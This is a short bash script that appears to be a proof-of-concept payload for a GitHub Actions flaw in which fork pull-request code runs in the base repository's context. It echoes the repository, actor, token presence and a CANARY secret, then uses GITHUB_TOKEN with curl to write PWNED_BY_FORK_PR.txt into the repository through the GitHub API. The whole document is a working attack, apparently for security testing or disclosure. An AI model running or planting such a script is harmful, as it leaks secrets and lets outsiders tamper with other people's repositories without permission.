#!/bin/bash
echo "=== PR-CONTROLLED CODE IN BASE CONTEXT ==="
echo "repo=$GITHUB_REPOSITORY actor=$GITHUB_ACTOR"
echo "TOKEN_PRESENT=${GITHUB_TOKEN:+yes}"
echo "CANARY_SECRET=$CANARY"
curl -s -X PUT -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/PWNED_BY_FORK_PR.txt -d "{\"message\":\"fork-pr write\",\"content\":\"b3duZWQ=\"}" -o /dev/null -w "base-write=%{http_code}\n"
